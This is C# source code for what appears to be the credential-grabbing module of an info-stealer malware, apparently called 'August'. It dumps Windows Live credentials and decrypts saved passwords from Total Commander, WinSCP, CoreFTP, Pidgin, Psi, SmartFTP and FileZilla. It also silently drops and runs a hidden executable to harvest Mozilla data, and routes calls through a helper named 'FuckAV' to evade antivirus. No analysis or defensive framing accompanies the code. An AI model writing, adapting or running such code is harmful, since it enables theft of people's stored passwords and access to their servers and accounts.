using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace August
{
    class Grab
    {
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

        public enum CRED_TYPE : uint
        {
            GENERIC = 1,
            DOMAIN_PASSWORD = 2,
            DOMAIN_CERTIFICATE = 3,
            DOMAIN_VISIBLE_PASSWORD = 4,
            GENERIC_CERTIFICATE = 5,
            DOMAIN_EXTENDED = 6,
            MAXIMUM = 7,
            MAXIMUM_EX = (MAXIMUM + 1000),
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct NativeCredential
        {
            public UInt32 Flags;
            public CRED_TYPE Type;
            public IntPtr TargetName;
            public IntPtr Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public UInt32 CredentialBlobSize;
            public IntPtr CredentialBlob;
            public UInt32 Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            public IntPtr UserName;
        }
        public enum CRED_PERSIST : uint
        {
            SESSION = 1,
            LOCAL_MACHINE = 2,
            ENTERPRISE = 3,
        }
        public static List<string[]> LiveMessenger()
        {
            var Result = new List<string[]>();
            int Count = 0;
            IntPtr Credential = IntPtr.Zero;
            if (CredEnumerate("WindowsLive:name=*", 0, out Count, out Credential))
            {
                if (Count != 0)
                {
                    for (int n = 0; n < Count; n++)
                    {
                        IntPtr Pointer = Marshal.ReadIntPtr(Credential, n * Marshal.SizeOf(typeof(IntPtr)));
                        NativeCredential MainCred = new NativeCredential();
                        MainCred = (NativeCredential)Marshal.PtrToStructure(Pointer, typeof(NativeCredential));
                        try
                        {
                            string Username = Marshal.PtrToStringUni(MainCred.UserName);
                            string Password = String.Empty;
                            if (MainCred.CredentialBlob != IntPtr.Zero)
                            {
                                try
                                {
                                    Password = Marshal.PtrToStringUni(MainCred.CredentialBlob);
                                }
                                catch { }
                            }
                            if (!String.IsNullOrEmpty(Password)) Result.Add(new string[] { Username, Password });
                        }
                        catch { }
                    }
                }
            }
            return Result;
        }
        private static long RandomBase = 0;
        public static string Mozilla(string Product)
        {
            string Mozy = String.Empty;
            while (String.IsNullOrEmpty(Mozy) || File.Exists(Mozy))
            {
                Mozy = Path.GetTempPath() + "\\" + Utils.GetRandomString(Utils.GetRandomNumber(1, 12)) + ".exe";
            }
            File.WriteAllBytes(Mozy, Properties.Resources.Mozy);
            Process Grabber = Process.Start(new ProcessStartInfo()
            {
                FileName = Mozy,
                Arguments = Product,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
            string Out = Grabber.StandardOutput.ReadToEnd();
            Grabber.WaitForExit();
            return Out;
        }
        public static string DecryptTotalCommander(string Input)
        {
            byte[] Pbytes = new byte[Input.Length / 2];
            for (int i = 0; i < Input.Length; i += 2)
                Pbytes[i / 2] = Convert.ToByte(Input.Substring(i, 2), 16);
            Pbytes = (byte[])Utils.FuckAV("Slice", new object[] { Pbytes, 0, Pbytes.Length - 4 });
            RandomBase = 849521;
            for (int i = 0; i < Pbytes.Length; i++)
            {
                Pbytes[i] = (byte)Shift(Pbytes[i], (int)Random(8));
            }
            RandomBase = 12345;
            for (int i = 0; i < 256; i++)
            {
                int A = (int)Random((uint)Pbytes.Length);
                int B = (int)Random((uint)Pbytes.Length);
                byte Temp = 0;
                Temp = Pbytes[B];
                Pbytes[B] = Pbytes[A];
                Pbytes[A] = Temp;
            }
            RandomBase = 42340;
            for (int i = 0; i < Pbytes.Length; i++)
            {
                Pbytes[i] = (byte)((Pbytes[i] ^ Random(256)) & 0xff);
            }
            RandomBase = 54321;
            for (int i = 0; i < Pbytes.Length; i++)
            {
                Pbytes[i] = (byte)((Pbytes[i] - Random(256)) & 0xff);
            }
            string Clean = String.Empty;
            for (int i = 0; i < Pbytes.Length; i++)
            {
                Clean += (char)Pbytes[i];
            }
            return Clean;
        }
        private static long Random(uint Max)
        {
            RandomBase = ((RandomBase * 0x8088405) & 0xffffffff) + 1;
            return (((RandomBase * Max) >> 32) & 0xffffffff);
        }
        private static long Shift(int N1, int N2)
        {
            return (((N1 << N2) & 0xffffffff) | ((N1 >> (8 - N2)) & 0xffffffff)) & 0xff;
        }
        public static List<string[]> TotalCommander()
        {
            object Temp = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Ghisler\Total Commander", "FtpIniName", null);
            if (Temp == null) return null;
            string Ini = Temp.ToString().Replace("%APPDATA%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            if (!File.Exists(Ini)) return null;
            string Inif = File.ReadAllText(Ini, Encoding.UTF8);
            int Idx = Inif.IndexOf("[connections]");
            string Connections = Inif.Remove(Idx, Idx + 14);
            Connections = Connections.Remove(Connections.IndexOf("[default]")).Trim('\n');
            List<string[]> Results = new List<string[]>();
            foreach (var Connection in Connections.Split('\n'))
            {
                string Name = Connection.Split('=')[1];
                Name = Name.Replace(((char)0x0D).ToString(), String.Empty);
                string Brackets = '['+ Name + ']';
                Idx = Inif.IndexOf(Brackets);
                string Val = Inif.Remove(0, Idx + Brackets.Length + 2);
                int Iof = Val.IndexOf('[');
                if (Iof >= 0)
                {
                    Val = Val.Remove(Iof);
                }
                Val = Val.Remove(Val.Length - 1);
                string Host, Username, Password;
                string[] Lines = Val.Split('\n');
                Host = Lines[0].Replace(((char)0x0D).ToString(), String.Empty).Split('=')[1];
                Username = Lines[1].Replace(((char)0x0D).ToString(), String.Empty).Split('=')[1];
                Password = Lines[2].Replace(((char)0x0D).ToString(), String.Empty).Split('=')[1];
                if(!String.IsNullOrEmpty(Host) && !String.IsNullOrEmpty(Username) && !String.IsNullOrEmpty(Password))
                {
                    Results.Add(new string[] { Host, Username, DecryptTotalCommander(Password) });
                }
            }
            return Results;
        }
        public static string DecryptWinSCP(string Hostname, string Username, string Password)
        {
            byte[] Pbytes = new byte[Password.Length];
            for (int i = 0; i < Password.Length; i++)
            {
                Pbytes[i] = (byte)int.Parse(Password[i].ToString(), System.Globalization.NumberStyles.HexNumber);
            }
            byte Flag = DNC(Pbytes, out Pbytes);
            byte Length = 0;
            if (Flag == 0xFF)
            {
                DNC(Pbytes, out Pbytes);
                Length = DNC(Pbytes, out Pbytes);
            }
            else Length = Flag;
            byte toBeDeleted = DNC(Pbytes, out Pbytes);
            Pbytes = (byte[])Utils.FuckAV("Slice", new object[] { Pbytes, 0, toBeDeleted * 2 });
            string Clear = String.Empty;
            byte[] Res = new byte[Length];

            for (int i=0;i< Res.Length; i++)
            {
                Res[i] = DNC(Pbytes, out Pbytes);
            }
            Res = (byte[])Utils.FuckAV("Slice", new object[] { Res, 0, 2 });
            for (int i=0;i< Res.Length; i++)
            {
                Clear += (char)Res[i];
            }
            string Key = (Username + Hostname).Remove(0, 2);
            if (Flag == 0xFF)
            {
                for (int i = 0; i < Key.Length; i++)
                {
                    int Idx = Clear.IndexOf(Key.Remove(0, i));
                    if (Idx >= 0)
                    {
                        Clear = Clear.Remove(Idx, Idx + 1);
                    }
                    else break;
                }
            }
            return Clear;
        }
        public static byte DNC(byte[] Input, out byte[] Arr)
        {
            if(Input.Length == 0)
            {
                Arr = new byte[0];
                return 0;
            }
            byte A = Input[0];
            byte B = Input[1];
            Arr = (byte[])Utils.FuckAV("Slice", new object[] { Input, 0, 2 });
            int L = (((((A << 4) + B) ^ 0xA3) & 0xff) + 1) * -1;
            byte R = (byte)(L < 0 ? 256 - Math.Abs(L) : L);
            return R;
        }
        public static List<string[]> WinSCP()
        {
            var Results = new List<string[]>();
            using (RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions\\"))
            {
                string[] Subkeys = Key.GetSubKeyNames();
                foreach (var Subk in Subkeys)
                {
                    if (Subk == "Default%20Settings") continue;
                    using (RegistryKey Cat = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + Subk))
                    {
                        string Hostname = Cat.GetValue("HostName").ToString();
                        string UserName = Cat.GetValue("UserName").ToString();
                        string Password = Cat.GetValue("Password").ToString();
                        Results.Add(new string[] { Hostname, UserName, DecryptWinSCP(Hostname, UserName, Password) });
                    }
                }
            }
            return Results;
        }
        private static string DecryptCoreFTPPassword(string HexString)
        {
            StringBuilder buffer = new StringBuilder(HexString.Length * 3 / 2);
            for (int i = 0; i < HexString.Length; i++)
            {
                if ((i > 0) & (i % 2 == 0))
                    buffer.Append("-");
                buffer.Append(HexString[i]);
            }
            string Reversed = buffer.ToString();
            int length = (Reversed.Length + 1) / 3;
            byte[] arr = new byte[length];
            for (int i = 0; i < length; i++)
            {
                arr[i] = Convert.ToByte(Reversed.Substring(3 * i, 2), 16);
            }
            RijndaelManaged AES = new RijndaelManaged()
            {
                Mode = CipherMode.ECB,
                Key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk"),
                Padding = PaddingMode.Zeros,
            };
            ICryptoTransform Transform = AES.CreateDecryptor(AES.Key, AES.IV);
            return Encoding.UTF8.GetString(Transform.TransformFinalBlock(arr, 0, arr.Length));
        }
        public static List<string[]> CoreFTP()
        {
            string Sites = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CoreFTP\sites.idx";
            if (!File.Exists(Sites)) return null;
            List<ushort> Ids = new List<ushort>();
            var Results = new List<string[]>();
            foreach (var Line in File.ReadAllLines(Sites))
            {
                if (String.IsNullOrEmpty(Line)) continue;
                Ids.Add(ushort.Parse(Line.Split(' ')[0]));
            }
            foreach(var Id in Ids)
            {
                string Host = String.Empty,
                       Port = String.Empty,
                       User = String.Empty,
                       PW = String.Empty;
                object Abstr = Registry.GetValue("HKEY_CURRENT_USER\\Software\\FTPWare\\CoreFTP\\Sites\\" + Id, "Host", null);
                if (Abstr != null) Host = Abstr.ToString();
                Abstr = Registry.GetValue("HKEY_CURRENT_USER\\Software\\FTPWare\\CoreFTP\\Sites\\" + Id, "Port", null);
                if (Abstr != null) Port = Abstr.ToString();
                Abstr = Registry.GetValue("HKEY_CURRENT_USER\\Software\\FTPWare\\CoreFTP\\Sites\\" + Id, "User", null);
                if (Abstr != null) User = Abstr.ToString();
                Abstr = Registry.GetValue("HKEY_CURRENT_USER\\Software\\FTPWare\\CoreFTP\\Sites\\" + Id, "PW", null);
                if (Abstr != null) PW = DecryptCoreFTPPassword(Abstr.ToString()).Trim().Replace("\0", String.Empty);
                Results.Add(new string[] { Host, Port, User, PW });
            }
            return Results;
        }
        public static List<string[]> Pidgin(string FileName)
        {
            List<string[]> LoginData = new List<string[]>();
            string Xml = File.ReadAllText(FileName);
            if (Xml.Contains("<account>"))
            {
                int Pxm = Xml.IndexOf("<protocol>");
                string Protocol = Xml.Remove(0, Pxm + 10);
                Pxm = Protocol.IndexOf("</protocol>");
                Protocol = Protocol.Remove(Pxm);
                Pxm = Xml.IndexOf("<name>");
                string Name = Xml.Remove(0, Pxm + 7);
                Pxm = Name.IndexOf("</name>");
                Name = Name.Remove(Pxm);
                Pxm = Xml.IndexOf("<password>");
                string Password = Xml.Remove(0, Pxm + 10);
                Pxm = Password.IndexOf("</password>");
                Password = Password.Remove(Pxm);
                LoginData.Add(new string[] { Protocol, Name, Password });
            }
            return LoginData;
        }
        public static List<string[]> Psi(string FileName)
        {
            List<string[]> LoginData = new List<string[]>();
            string XmlContents = File.ReadAllText(FileName);
            if (XmlContents.Contains("<password") && XmlContents.Contains("<jid"))
            {
                while (XmlContents.Contains("<roster-cache>") && XmlContents.Contains("</roster-cache>"))
                {
                    int Idx = XmlContents.IndexOf("<roster-cache>");
                    int Ldx = XmlContents.IndexOf("</roster-cache>");
                    XmlContents = XmlContents.Remove(Idx, Ldx - Idx + 15);
                }
                MatchCollection Jids = new Regex(@"\<jid type=""QString""\>(.)*\<\/jid\>", RegexOptions.IgnoreCase).Matches(XmlContents);
                MatchCollection Passwords = new Regex(@"\<password type=""QString""\>(.)*\<\/password\>", RegexOptions.IgnoreCase).Matches(XmlContents);
                for (int i = 0; i < Jids.Count; i++)
                {
                    string Jid = Jids[i].ToString().Replace("<jid type=\"QString\">", String.Empty).Replace("</jid>", String.Empty);
                    string Password = Passwords[i].ToString().Replace("<password type=\"QString\">", String.Empty).Replace("</password>", String.Empty);
                    string Decrypted = String.Empty;
                    int Lidx = 0;
                    for (int k = 0; k < Password.Length / 4; k++)
                    {
                        if (Lidx == Jid.Length) Lidx = 0;
                        Decrypted += (char)(Convert.ToInt32(Password.Substring(k * 4, 4), 16) ^ Jid[Lidx]);
                        Lidx++;
                    }
                    LoginData.Add(new string[] { Jid, Decrypted});
                }
            }
            return LoginData;
        }
        public static List<string[]> SmartFTP(string FileName)
        {
            List<string[]> LoginData = new List<string[]>();
            string XmlContents = File.ReadAllText(FileName);
            if (!XmlContents.Contains("<Host>") || !XmlContents.Contains("<Port>") || !XmlContents.Contains("<User>") || !XmlContents.Contains("<Password>"))
                return null;
            int Idx = XmlContents.IndexOf("<Host>");
            string Host = XmlContents.Remove(0, Idx + 6);
            Host = Host.Remove(Host.IndexOf("</Host>"));
            Idx = XmlContents.IndexOf("<Port>");
            string Port = XmlContents.Remove(0, Idx + 6);
            Port = Port.Remove(Port.IndexOf("</Port>"));
            Idx = XmlContents.IndexOf("<User>");
            string User = XmlContents.Remove(0, Idx + 6);
            User = User.Remove(User.IndexOf("</User>"));
            Idx = XmlContents.IndexOf("<Password>");
            string Password = XmlContents.Remove(0, Idx + 10);
            Password = Password.Remove(Password.IndexOf("</Password>"));
            byte[] Pbytes = new byte[Password.Length / 2];
            for (int i = 0; i < Password.Length; i += 2)
                Pbytes[i / 2] = Convert.ToByte(Password.Substring(i, 2), 16);
            Pbytes[Pbytes.Length - 1] = 0;
            IntPtr Prov = IntPtr.Zero;
            IntPtr Hash = IntPtr.Zero;
            IntPtr Key = IntPtr.Zero;
            uint Plength = (uint)Pbytes.Length;
            byte[] Mash = new byte[] { 0x53, 0x00, 0x6D, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x46, 0x00, 0x54, 0x00, 0x50, 0x00 };
            if (!Crypt32.CryptAcquireContext(ref Prov, null, "Microsoft Enhanced Cryptographic Provider v1.0", 1, 0xF0000000)) return null;
            if (!Crypt32.CryptCreateHash(Prov, 0x00008003, IntPtr.Zero, 0, ref Hash)) return null;
            if (!Crypt32.CryptHashData(Hash, Mash, 16, 0)) return null;
            if (!Crypt32.CryptDeriveKey(Prov, 0x00006801, Hash, 0x00800000, ref Key)) return null;
            if (!Crypt32.CryptDecrypt(Key, IntPtr.Zero, 1, 0, Pbytes, ref Plength)) return null;
            Password = String.Empty;
            for(int i=0;i< Pbytes.Length;i++)
            {
                if(i != 0 && i != Pbytes.Length-1)
                {
                    if(Pbytes[i] == 0 && Pbytes[i - 1] != 0 && Pbytes[i + 1] != 0)
                    {
                        continue;
                    }
                }
                Password += Encoding.UTF8.GetString(new byte[] { Pbytes[i] });
            }
            Password = Password.Remove(Password.Length - 1);
            LoginData.Add(new string[] { Host, Port, User, Password });
            return LoginData;
        }
        public static List<string[]> FileZilla(string FileName)
        {
            List<string[]> LoginData = new List<string[]>();
            string XmlContents = File.ReadAllText(FileName);
            if (!XmlContents.Contains("<FileZilla3")) return null;
            MatchCollection Hosts = new Regex(@"\<Host\>(.)*\<\/Host\>", RegexOptions.IgnoreCase).Matches(XmlContents);
            MatchCollection Ports = new Regex(@"\<Port\>(.)*\<\/Port\>", RegexOptions.IgnoreCase).Matches(XmlContents);
            MatchCollection Users = new Regex(@"\<User\>(.)*\<\/User\>", RegexOptions.IgnoreCase).Matches(XmlContents);
            MatchCollection Passwords = new Regex(@"\<Pass encoding=""(.)*""\>(.)*\<\/Pass\>", RegexOptions.IgnoreCase).Matches(XmlContents);
            for (int i = 0; i < Hosts.Count; i++)
            {
                string User = Users[i].ToString().Replace("<User>", String.Empty).Replace("</User>", String.Empty);
                string Host = Hosts[i].ToString().Replace("<Host>", String.Empty).Replace("</Host>", String.Empty);
                string Port = Ports[i].ToString().Replace("<Port>", String.Empty).Replace("</Port>", String.Empty);
                string Password = Passwords[i].ToString();
                int Idx = Password.IndexOf(">") + 1;
                Password = Password.Remove(0, Idx);
                Password = Password.Remove(Password.Length - 7);
                Password = Encoding.UTF8.GetString(Convert.FromBase64String(Password));
                LoginData.Add(new string[] { Host, Port, User, Password });
            }
            return LoginData;
        }
    }
}
